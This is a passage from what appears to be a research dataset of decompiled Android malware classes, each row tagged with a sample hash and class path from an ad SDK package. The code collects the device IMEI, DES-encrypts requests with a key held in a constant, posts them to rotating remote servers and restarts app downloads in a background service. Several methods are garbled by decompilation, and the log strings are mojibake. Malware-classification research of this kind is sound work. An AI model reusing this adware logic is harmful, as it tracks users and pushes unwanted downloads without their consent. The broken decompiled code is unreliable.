a=aVar.a(businessDataContext.getAdType(),businessDataContext.getRequestData().getAd().getCategory().intValue());     if (a == null) {       return;     }     T a2=aVar.a(businessDataContext.getAdType(),a.getAdId(),a.getCategory().intValue());     int k=aVar.k(businessDataContext.getAdType());     T a3=a((aa<T>)a2,businessDataContext.getAdType(),(com.fw.tzthree.db.a<aa<T>>)businessDataContext.getDbHelper(),k);   }   @Override public void b(  BusinessDataContext<T> businessDataContext){     super.b((BusinessDataContext)businessDataContext);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\ab.code","!org.eclipse.jdt.core.dom.TypeDeclaration@656eb2eb"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\ac.code","class ac extends TypeToken<RootNode<BannerAdInfo>> {   final ab a;   public ac(  ab abVar){     this.a=abVar;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\ad.code","class ad extends TypeToken<RootNode<TableplaqueAdInfo>> {   final ab a;   public ad(  ab abVar){     this.a=abVar;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\ae.code","class ae extends TypeToken<RootNode<PushAdInfo>> {   final ab a;   public ae(  ab abVar){     this.a=abVar;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\af.code","class af extends TypeToken<RootNode<CreditsWallAdInfo>> {   final ab a;   public af(  ab abVar){     this.a=abVar;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\ag.code","class ag extends TypeToken<RootNode<AppWallAdInfo>> {   final ab a;   public ag(  ab abVar){     this.a=abVar;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\ah.code","class ah extends TypeToken<RootNode<FullScreenAdInfo>> {   final ab a;   public ah(  ab abVar){     this.a=abVar;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\ai.code","class ai extends TypeToken<RootNode<CustomAdInfo>> {   final ab a;   public ai(  ab abVar){     this.a=abVar;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\aj.code","class aj extends TypeToken<RootNode<PushAdInfo>> {   final ab a;   public aj(  ab abVar){     this.a=abVar;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\ak.code","public interface ak<T> {   void b(  T t); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\b.code","public class b<T extends AdInfo> extends a<T> {   @Override public void a(  BusinessDataContext<T> businessDataContext){     super.a((BusinessDataContext)businessDataContext);     com.fw.tzthree.db.a<T> dbHelper=businessDataContext.getDbHelper();     c(businessDataContext,dbHelper);     Action action=businessDataContext.getRequestData().getAction().getActions().get(0);     Integer a=dbHelper.a(action.getAction(),businessDataContext.getAdType());     if (a == null || a.intValue() <= 0) {       return;     }     ActionInfo a2=dbHelper.a(businessDataContext.getAdType(),action.getAction(),action.getAdId());     if (a2 == null) {       dbHelper.a(businessDataContext.getAdType(),action,a);       businessDataContext.setInterrupt(true);       return;     }     a2.setCount(Integer.valueOf(a2.getCount().intValue() + 1));     a2.setDate(action.getDate());     if (com.fw.tzthree.d.ab.a() <= dbHelper.j(businessDataContext.getAdType()).getExpireDate().longValue()) {       dbHelper.a(a2);       businessDataContext.setInterrupt(true);       return;     }     action.setCount(a2.getCount());     a2.setExpireDate(Long.valueOf(com.fw.tzthree.d.ab.a() + (a.intValue() * 1000)));     dbHelper.a(a2);     List<ActionInfo> a3=dbHelper.a(businessDataContext.getAdType(),action);     if (a3.size() != 0) {       for (      ActionInfo actionInfo : a3) {         if (com.fw.tzthree.d.ab.a() > actionInfo.getExpireDate().longValue()) {           actionInfo.setExpireDate(Long.valueOf(com.fw.tzthree.d.ab.a() + (a.intValue() * 1000)));           dbHelper.a(actionInfo);           Action action2=new Action();           action2.setAction(actionInfo.getAction());           action2.setAdId(actionInfo.getAdId());           action2.setAppName(actionInfo.getAppName());           action2.setCount(actionInfo.getCount());           action2.setDate(actionInfo.getDate());           action2.setPackageName(actionInfo.getPackageName());           businessDataContext.getRequestData().getAction().getActions().add(action2);         }       }     }   }   @Override protected void a(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar){     for (    Action action : businessDataContext.getRequestData().getAction().getActions()) {       com.fw.tzthree.d.s.a(""show"",""åŠ¨ä½œå�‘é€�å¤±è´¥-- adType : "" + businessDataContext.getAdType() + "" adId : ""+ action.getAdId()+ "" action : ""+ action.getAction()+ "" count : ""+ action.getCount());     }     Action action2=businessDataContext.getRequestData().getAction().getActions().get(0);     Integer a=aVar.a(action2.getAction(),businessDataContext.getAdType());     if (a == null || a.intValue() <= 0) {       ActionInfo a2=aVar.a(businessDataContext.getAdType(),action2.getAction(),action2.getAdId());       if (a2 == null) {         aVar.a(businessDataContext.getAdType(),action2,(Integer)0);       }  else {         a2.setCount(Integer.valueOf(a2.getCount().intValue() + 1));         aVar.a(a2);       }     }   }   @Override public void b(  BusinessDataContext<T> businessDataContext){     super.b((BusinessDataContext)businessDataContext);   }   @Override protected void b(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar){     aVar.g(businessDataContext.getRequestData().getAction().getActions(),businessDataContext.getAdType());   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\c.code","public abstract class c<T extends AdInfo> extends a<T> {   protected AdHinge a;   private void d(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar){     businessDataContext.setHasCache(false);     int adType=businessDataContext.getAdType();     businessDataContext.getRequestData().getAd().setLastAdId((3 == adType ? aVar.a(businessDataContext.getAdType(),businessDataContext.getRequestData().getAd().getShowStyle().intValue()) : 6 == adType ? aVar.a(businessDataContext.getAdType(),0) : aVar.a(businessDataContext.getAdType(),businessDataContext.getRequestData().getAd().getCategory().intValue())).getLastAdId());     c(businessDataContext,aVar);   }   private void e(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar){     businessDataContext.getRequestData().getAd().setLastAdId(0);     DeviceInfo a=aVar.a();     if (a == null || a.getImei() == null || a.getImei().equals("""")) {       for (int i=0; i < 3; i++) {         SystemClock.sleep(2000L);         a=aVar.a();         if (a.getImei() != null && !"""".equals(a.getImei())) {           break;         }         if (i == 2) {           businessDataContext.setInterrupt(true);         }       }     }     if (businessDataContext.isInterrupt()) {       return;     }     businessDataContext.getRequestData().setDevice(com.fw.tzthree.d.h.a(a,aVar.b()));   }   abstract List<T> a(  BusinessDataContext<T> businessDataContext,  AdHinge adHinge);   public void a(  com.fw.tzthree.db.a<T> aVar,  AdHinge adHinge,  int i,  T t){     if (adHinge.getIsOver().booleanValue()) {       adHinge.setAdId(t.getAdId());       aVar.a(adHinge);       return;     }     if (t.getId().longValue() == i) {       adHinge.setIsOver(true);     }  else {       adHinge.setIsOver(false);     }     adHinge.setAdId(t.getAdId());     adHinge.setLastAdId(t.getAdId());     aVar.a(adHinge);   }   @Override public void a(  BusinessDataContext<T> businessDataContext){     if (businessDataContext.isNotNeedCache()) {       return;     }     com.fw.tzthree.db.a<T> dbHelper=businessDataContext.getDbHelper();     int adType=businessDataContext.getAdType();     if (3 == adType) {       this.a=dbHelper.a(businessDataContext.getAdType(),businessDataContext.getRequestData().getAd().getShowStyle().intValue());     }  else     if (6 == adType) {       this.a=dbHelper.a(businessDataContext.getAdType(),0);     }  else {       this.a=dbHelper.a(businessDataContext.getAdType(),businessDataContext.getRequestData().getAd().getCategory().intValue());     }     if (this.a == null) {       e(businessDataContext,dbHelper);       return;     }     List<T> a=a(businessDataContext,this.a);     if (a.size() == 0) {       if (businessDataContext.isInterrupt()) {         return;       }       d(businessDataContext,dbHelper);       return;     }     businessDataContext.setHasCache(true);     AdNode<T> adNode=new AdNode<>();     if (3 == businessDataContext.getAdType()) {       adNode.setShowStyle(businessDataContext.getRequestData().getAd().getShowStyle());     }  else     if (5 == businessDataContext.getAdType()) {       adNode.setCategory(businessDataContext.getRequestData().getAd().getCategory());     }  else     if (6 == businessDataContext.getAdType()) {       adNode.setCategory(businessDataContext.getRequestData().getAd().getCategory());     }     adNode.setAdList(a);     businessDataContext.setResponseData(businessDataContext.getRequestData());     businessDataContext.getResponseData().setAd(adNode);   }   @Override public void b(  BusinessDataContext<T> businessDataContext){     super.b((BusinessDataContext)businessDataContext);   }   @Override public void b(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar){     List<T> adList;     if (businessDataContext.getResponseData().getAd() == null || (adList=businessDataContext.getResponseData().getAd().getAdList()) == null || adList.size() == 0) {       return;     }     int intValue=businessDataContext.getResponseData().getAd().getCategory().intValue();     if (3 == businessDataContext.getResponseData().getAd().getAdType().intValue()) {       intValue=businessDataContext.getResponseData().getAd().getShowStyle().intValue();     }     if (businessDataContext.getCount() == 0) {       aVar.b(businessDataContext.getAdType(),intValue);     }     aVar.a(adList,businessDataContext.getAdType(),intValue);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\d.code","public class d<T extends AdInfo> extends c<T> {   @Override List<T> a(  BusinessDataContext<T> businessDataContext,  AdHinge adHinge){     return businessDataContext.getDbHelper().m(businessDataContext.getCount());   }   @Override public void a(  BusinessDataContext<T> businessDataContext){     super.a((BusinessDataContext)businessDataContext);   }   @Override protected void a(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar){   }   @Override public void b(  BusinessDataContext<T> businessDataContext){     super.b((BusinessDataContext)businessDataContext);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\e.code","public class e<T extends AdInfo> extends c<T> {   @Override List<T> a(  BusinessDataContext<T> businessDataContext,  AdHinge adHinge){     return businessDataContext.getDbHelper().n();   }   @Override public void a(  BusinessDataContext<T> businessDataContext){     super.a((BusinessDataContext)businessDataContext);   }   @Override protected void a(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar){   }   @Override public void b(  BusinessDataContext<T> businessDataContext){     super.b((BusinessDataContext)businessDataContext);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\f.code","public class f<T extends AdInfo> extends c<T> {   @Override List<T> a(  BusinessDataContext<T> businessDataContext,  AdHinge adHinge){     List<T> m=businessDataContext.getDbHelper().m();     ArrayList arrayList=new ArrayList();     arrayList.addAll(m);     if (arrayList != null && arrayList.size() != 0) {       if (com.fw.tzthree.d.ab.a() - ((AdInfo)arrayList.get(0)).getExpires().longValue() >= 0) {         businessDataContext.getHandler().post(new g(this,arrayList,businessDataContext));         businessDataContext.setNoNeedCallback(true);         m.clear();       }     }     return m;   }   @Override public void a(  BusinessDataContext<T> businessDataContext){     super.a((BusinessDataContext)businessDataContext);   }   @Override protected void a(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar){   }   @Override public void b(  BusinessDataContext<T> businessDataContext){     super.b((BusinessDataContext)businessDataContext);   }   @Override protected void b(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar){     super.b(businessDataContext,aVar);     List<T> adList=businessDataContext.getResponseData().getAd().getAdList();     SettingNode setting=businessDataContext.getResponseData().getSetting();     Iterator<T> it=adList.iterator();     while (it.hasNext()) {       com.fw.tzthree.d.n.a(businessDataContext.getContext(),setting.getResourcesAddr() + ((AppWallAdInfo)it.next()).getIcon(),(com.fw.tzthree.d.q)null);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\g.code","class g implements Runnable {   final List a;   final BusinessDataContext b;   final f c;   public g(  f fVar,  List list,  BusinessDataContext businessDataContext){     this.c=fVar;     this.a=list;     this.b=businessDataContext;   }   @Override public void run(){     BusinessDataContext businessDataContext=new BusinessDataContext();     RootNode rootNode=new RootNode();     AdNode adNode=new AdNode();     adNode.setAdList(this.a);     rootNode.setAd(adNode);     businessDataContext.setResponseData(rootNode);     this.b.getRequestCallBack().onCallBack(businessDataContext);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\h.code","public class h<T extends AdInfo> implements ak<BusinessDataContext<T>>, m<BusinessDataContext<T>> {   private byte[] a(  byte[] bArr,  String str){     NoSuchAlgorithmException e;     SecretKeyFactory secretKeyFactory;     Cipher cipher=null;     DESKeySpec dESKeySpec=new DESKeySpec(str.getBytes());     try {       secretKeyFactory=SecretKeyFactory.getInstance(""DES"");     }  catch (    NoSuchAlgorithmException e2) {       e=e2;       secretKeyFactory=null;     }     try {       cipher=Cipher.getInstance(""DES"");     }  catch (    NoSuchAlgorithmException e3) {       e=e3;       com.fw.tzthree.d.s.a(e);       cipher.init(1,secretKeyFactory.generateSecret(dESKeySpec));       return cipher.doFinal(bArr);     }     cipher.init(1,secretKeyFactory.generateSecret(dESKeySpec));     return cipher.doFinal(bArr);   }   private byte[] b(  byte[] bArr,  String str){     NoSuchAlgorithmException e;     SecretKeyFactory secretKeyFactory;     Cipher cipher=null;     if (bArr == null) {       return null;     }     DESKeySpec dESKeySpec=new DESKeySpec(str.getBytes());     try {       secretKeyFactory=SecretKeyFactory.getInstance(""DES"");     }  catch (    NoSuchAlgorithmException e2) {       e=e2;       secretKeyFactory=null;     }     try {       cipher=Cipher.getInstance(""DES"");     }  catch (    NoSuchAlgorithmException e3) {       e=e3;       e.printStackTrace();       cipher.init(2,secretKeyFactory.generateSecret(dESKeySpec));       return cipher.doFinal(bArr);     }     cipher.init(2,secretKeyFactory.generateSecret(dESKeySpec));     return cipher.doFinal(bArr);   }   @Override public void a(  BusinessDataContext<T> businessDataContext){     if (businessDataContext.isInterrupt() || businessDataContext.isHasCache()) {       return;     }     byte[] bArr=null;     try {       bArr=a(businessDataContext.getRequestByteData(),com.fw.tzthree.b.a.A);     }  catch (    InvalidKeyException e) {       com.fw.tzthree.d.s.a(e);     } catch (    InvalidKeySpecException e2) {       com.fw.tzthree.d.s.a(e2);     } catch (    BadPaddingException e3) {       com.fw.tzthree.d.s.a(e3);     } catch (    IllegalBlockSizeException e4) {       com.fw.tzthree.d.s.a(e4);     } catch (    NoSuchPaddingException e5) {       com.fw.tzthree.d.s.a(e5);     }     businessDataContext.setRequestByteData(bArr);   }   @Override public void b(  BusinessDataContext<T> businessDataContext){     if (businessDataContext.isInterrupt() || businessDataContext.isHasCache()) {       return;     }     byte[] bArr=null;     try {       bArr=b(businessDataContext.getResponseByteData(),com.fw.tzthree.b.a.A);     }  catch (    InvalidKeyException e) {       com.fw.tzthree.d.s.a(e);     } catch (    InvalidKeySpecException e2) {       com.fw.tzthree.d.s.a(e2);     } catch (    BadPaddingException e3) {       com.fw.tzthree.d.s.a(e3);     } catch (    IllegalBlockSizeException e4) {       com.fw.tzthree.d.s.a(e4);     } catch (    NoSuchPaddingException e5) {       com.fw.tzthree.d.s.a(e5);     }     businessDataContext.setResponseByteData(bArr);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\i.code","public class i<T extends AdInfo> implements ak<BusinessDataContext<T>>, m<BusinessDataContext<T>> {   @Override public void a(  com.fw.tzthree.model.BusinessDataContext<T> r4){     throw new UnsupportedOperationException(""Method not decompiled: com.fw.tzthree.c.a.i.a(com.fw.tzthree.model.BusinessDataContext):void"");   }   @Override public void b(  com.fw.tzthree.model.BusinessDataContext<T> r6){     throw new UnsupportedOperationException(""Method not decompiled: com.fw.tzthree.c.a.i.b(com.fw.tzthree.model.BusinessDataContext):void"");   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\j.code","public class j<T extends AdInfo> extends c<T> {   @Override List<T> a(  BusinessDataContext<T> businessDataContext,  AdHinge adHinge){     com.fw.tzthree.db.a<T> dbHelper=businessDataContext.getDbHelper();     List<T> p=dbHelper.p();     ArrayList arrayList=new ArrayList();     if (p != null && p.size() != 0) {       int i=0;       while (true) {         int i2=i;         if (i2 >= p.size()) {           break;         }         if (!dbHelper.a(p.get(i2).getPackageName())) {           arrayList.add(p.get(i2));         }         i=i2 + 1;       }     }     return arrayList;   }   @Override public void a(  BusinessDataContext<T> businessDataContext){     super.a((BusinessDataContext)businessDataContext);   }   @Override protected void a(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar){   }   @Override public void b(  BusinessDataContext<T> businessDataContext){     super.b((BusinessDataContext)businessDataContext);   }   @Override public void b(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar){     super.b(businessDataContext,aVar);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\k.code","public class k<T extends AdInfo> implements ak<BusinessDataContext<T>> {   private int a(  String[] strArr,  int i){     int i2=i + 1;     if (i2 >= strArr.length) {       return 0;     }     return i2;   }   @Override public void b(  BusinessDataContext<T> businessDataContext){     if (businessDataContext.isInterrupt() || businessDataContext.isHasCache() || businessDataContext.getStateCode() == 200 || com.fw.tzthree.d.e.b(businessDataContext.getContext()) == 0) {       return;     }     String[] strArr=com.fw.tzthree.b.a.K;     String str=strArr[com.fw.tzthree.b.a.J];     int i=0;     while (true) {       int i2=i;       if (i2 >= 3) {         break;       }       if (Looper.myLooper() == null) {         Looper.prepare();       }       SyncHttpClient syncHttpClient=new SyncHttpClient();       String str2=str + businessDataContext.getUrl() + businessDataContext.getAdType();       if (businessDataContext.getGzip() == 1) {         syncHttpClient.addHeader(com.fw.tzthree.b.a.D,""1"");       }       syncHttpClient.addHeader(com.fw.tzthree.b.a.F,com.fw.tzthree.b.a.d);       syncHttpClient.addHeader(com.fw.tzthree.b.a.E,businessDataContext.getAppKey());       syncHttpClient.post(businessDataContext.getContext(),str2,new ByteArrayEntity(businessDataContext.getRequestByteData()),"""",new l(this,businessDataContext));       if (businessDataContext.getStateCode() == 200) {         break;       }  else {         i=i2 + 1;       }     }     if (businessDataContext.getStateCode() != 200) {       com.fw.tzthree.b.a.J=a(strArr,com.fw.tzthree.b.a.J);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\l.code","class l extends AsyncHttpResponseHandler {   final BusinessDataContext a;   final k b;   public l(  k kVar,  BusinessDataContext businessDataContext){     this.b=kVar;     this.a=businessDataContext;   }   @Override public void onFailure(  int i,  Header[] headerArr,  byte[] bArr,  Throwable th){     this.a.setStateCode(i);   }   @Override public void onSuccess(  int i,  Header[] headerArr,  byte[] bArr){     int i2=0;     this.a.setGzip(0);     int length=headerArr.length;     while (true) {       if (i2 >= length) {         break;       }       if (headerArr[i2].getName().equals(com.fw.tzthree.b.a.D)) {         this.a.setGzip(1);         break;       }       i2++;     }     this.a.setStateCode(i);     this.a.setResponseByteData(bArr);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\m.code","public interface m<T> {   void a(  T t); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\n.code","public class n<T extends AdInfo> implements ak<BusinessDataContext<T>>, m<BusinessDataContext<T>> {   public void a(  Context context){     com.fw.tzthree.db.a aVar=new com.fw.tzthree.db.a();     aVar.c(context);     for (    DownloadInfo downloadInfo : aVar.l()) {       if (downloadInfo.getCompleteTime().longValue() == 1) {         Intent intent=new Intent(context,(Class<?>)FwDservice.class);         AdInfo adInfo=new AdInfo();         adInfo.setAdId(downloadInfo.getAdId());         adInfo.setAppName(downloadInfo.getAppName());         adInfo.setG2Switches(downloadInfo.getG2Switches());         adInfo.setG3Switches(downloadInfo.getG3Switches());         adInfo.setPackageName(downloadInfo.getPackageName());         adInfo.setIcon(downloadInfo.getIcon());         adInfo.setUrl(downloadInfo.getUrl());         adInfo.setRecommend(downloadInfo.getRecommend());         adInfo.setWifiSwitches(downloadInfo.getWifiSwitches());         intent.putExtra(com.fw.tzthree.b.a.aX,adInfo);         intent.putExtra(com.fw.tzthree.b.a.ba,downloadInfo.getAdType());         intent.putExtra(""033C9AA179013A52D68F761D575E5A4A"",downloadInfo.getDownloadType());         intent.putExtra(com.fw.tzthree.b.a.bi,true);         context.startService(intent);       }     }   }   @Override public void a(  BusinessDataContext<T> businessDataContext){     if (businessDataContext.isInterrupt() || businessDataContext.isHasCache()) {     }   }   @Override public void b(  BusinessDataContext<T> businessDataContext){     if (200 == businessDataContext.getStateCode()) {       com.fw.tzthree.c.b.a.a().a(new o(this,businessDataContext));     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\o.code","public class o implements Runnable {   final BusinessDataContext a;   final n b;   public o(  n nVar,  BusinessDataContext businessDataContext){     this.b=nVar;     this.a=businessDataContext;   }   @Override public void run(){     this.b.a(this.a.getContext());   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\p.code","public class p<T extends AdInfo> extends c<T> {   private T a(  T t,  int i,  com.fw.tzthree.db.a<T> aVar,  int i2){     T a=t.getId().longValue() == ((long)i2) ? aVar.a(i,(Integer)1) : aVar.a(i,Integer.valueOf((int)(t.getId().longValue() + 1)));     if (a != null) {       return a;     }     com.fw.tzthree.d.s.b(""èŽ·å�–ä¸‹ä¸€æ�¡å¹¿å‘Šå¤±è´¥ï¼Œå¹¿å‘Šç±»åž‹ä¸º"" + i);     return null;   }   @Override List<T> a(  BusinessDataContext<T> businessDataContext,  AdHinge adHinge){     ArrayList arrayList=null;     com.fw.tzthree.db.a<T> dbHelper=businessDataContext.getDbHelper();     int k=dbHelper.k(businessDataContext.getAdType());     T a=dbHelper.a(businessDataContext.getAdType(),adHinge.getAdId(),adHinge.getCategory().intValue()); {       businessDataContext.setInterrupt(true);     }     T t=a;     int i=0;     T t2=null;     if (i >= k) {       break;     }     t2=a((p<T>)t,businessDataContext.getAdType(),(com.fw.tzthree.db.a<p<T>>)dbHelper,k);     if (t2 == null) {       businessDataContext.setInterrupt(true);       break;     }   }   @Override public void a(  BusinessDataContext<T> businessDataContext){     super.a((BusinessDataContext)businessDataContext);   }   @Override protected void a(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar){     AdHinge a=aVar.a(businessDataContext.getAdType(),businessDataContext.getRequestData().getAd().getShowStyle().intValue());     if (a == null) {       return;     }     T a2=aVar.a(businessDataContext.getAdType(),a.getAdId(),a.getCategory().intValue());     int k=aVar.k(businessDataContext.getAdType());     T a3=a((p<T>)a2,businessDataContext.getAdType(),(com.fw.tzthree.db.a<p<T>>)businessDataContext.getDbHelper(),k);   }   @Override public void b(  BusinessDataContext<T> businessDataContext){     super.b((BusinessDataContext)businessDataContext);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\q.code","public class q<T extends AdInfo> extends c<T> {   private T a(  T t,  int i,  com.fw.tzthree.db.a<T> aVar,  int i2){     T a=t.getId().longValue() == ((long)i2) ? aVar.a(i,(Integer)1) : aVar.a(i,Integer.valueOf((int)(t.getId().longValue() + 1)));     if (a == null) {       return null;     }     return a;   }   @Override List<T> a(  BusinessDataContext<T> businessDataContext,  AdHinge adHinge){     boolean z;     T t=null;     ArrayList arrayList=new ArrayList();     com.fw.tzthree.db.a<T> dbHelper=businessDataContext.getDbHelper();     int k=dbHelper.k(businessDataContext.getAdType());     T a=dbHelper.a(businessDataContext.getAdType(),adHinge.getAdId(),adHinge.getCategory().intValue());     if (a == null) {       businessDataContext.setInterrupt(true);       return null;     }     int i=0;     T t2=a;     T t3=null;     if (i >= k) {       t=t3;       break;     }     t3=a((q<T>)t2,businessDataContext.getAdType(),(com.fw.tzthree.db.a<q<T>>)dbHelper,k);     if (t3 == null) {       businessDataContext.setInterrupt(true);       t=t3;       break;     }   }   @Override public void a(  BusinessDataContext<T> businessDataContext){     super.a((BusinessDataContext)businessDataContext);   }   @Override protected void a(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar){   }   @Override public void b(  BusinessDataContext<T> businessDataContext){     super.b((BusinessDataContext)businessDataContext);   }   @Override public void b(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar){     super.b(businessDataContext,aVar);     List<T> adList=businessDataContext.getResponseData().getAd().getAdList();     SettingNode setting=businessDataContext.getResponseData().getSetting();     Iterator<T> it=adList.iterator();     while (it.hasNext()) {       com.fw.tzthree.d.n.a(businessDataContext.getContext(),setting.getResourcesAddr() + ((FullScreenAdInfo)it.next()).getFullScreenImg(),(com.fw.tzthree.d.q)null);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\r.code","class r implements Runnable {   final BusinessDataContext a;   final List b;   final q c;   public r(  q qVar,  BusinessDataContext businessDataContext,  List list){     this.c=qVar;     this.a=businessDataContext;     this.b=list;   }   @Override public void run(){     BusinessDataContext businessDataContext=new BusinessDataContext();     businessDataContext.setRequestData(this.a.getRequestData());     RootNode rootNode=new RootNode();     AdNode adNode=new AdNode();     adNode.setAdList(this.b);     adNode.setCategory(this.a.getRequestData().getAd().getCategory());     rootNode.setAd(adNode);     businessDataContext.setResponseData(rootNode);     BusinessDataContext businessDataContext2=this.a;     this.a.getRequestCallBack().onCallBack(businessDataContext);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\s.code","public class s<T extends AdInfo> extends c<T> {   @Override List<T> a(  BusinessDataContext<T> businessDataContext,  AdHinge adHinge){     com.fw.tzthree.db.a<T> dbHelper=businessDataContext.getDbHelper();     if (businessDataContext == null || businessDataContext.getRequestData() == null || businessDataContext.getRequestData().getAd() == null) {       return null;     }     return dbHelper.l(businessDataContext.getRequestData().getAd().getAdId().intValue());   }   @Override public void a(  BusinessDataContext<T> businessDataContext){     super.a((BusinessDataContext)businessDataContext);   }   @Override protected void a(  BusinessDataContext<T> businessDataContext,  com.fw.tzthree.db.a<T> aVar){   }   @Override public void b(  BusinessDataContext<T> businessDataContext){     super.b((BusinessDataContext)businessDataContext);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.c.a\t.code","public class t<T extends AdInfo> implements ak<BusinessDataContext<T>>, m<BusinessDataContext<T>> {   @Override public void a(  BusinessDataContext<T> businessDataContext){     if (businessDataContext.isInterrupt() || businessDataContext.isHasCache()) {       return;     }     if (Looper.myLooper() == null) {       Looper.prepare();     }     SyncHttpClient syncHttpClient=new SyncHttpClient();     String str=com.fw.tzthree.d.b.a() + businessDataContext.getUrl() + businessDataContext.getAdType();     if (businessDataContext.getGzip() == 1) {       syncHttpClient.addHeader(com.fw.tzthree.b.a.D,""1"");     }     syncHttpClient.addHeader(com.fw.tzthree.b.a.F,com.fw.tzthree.b.a.d);     syncHttpClient.addHeader(com.fw.tzthree.b.a.E,businessDataContext.getAppKey());     syncHttpClient.setTimeout(AsyncHttpClient.DEFAULT_SOCKET_TIMEOUT);     syncHttpClient.setMaxRetriesAndTimeout(3,AsyncHttpClient.DEFAULT_SOCKET_TIMEOUT);     syncHttpClient.post(businessDataContext.getContext(),str,new ByteArrayEntity(businessDataContext.getRequestByteData()),"""",new u(this,businessDataContext,syncHttpClient,str));   }   @Override public void b(  BusinessDataContext<T> businessDataContext){     if (businessDataContext.isInterrupt() || businessDataContext.isHasCache()) {     }   } } "
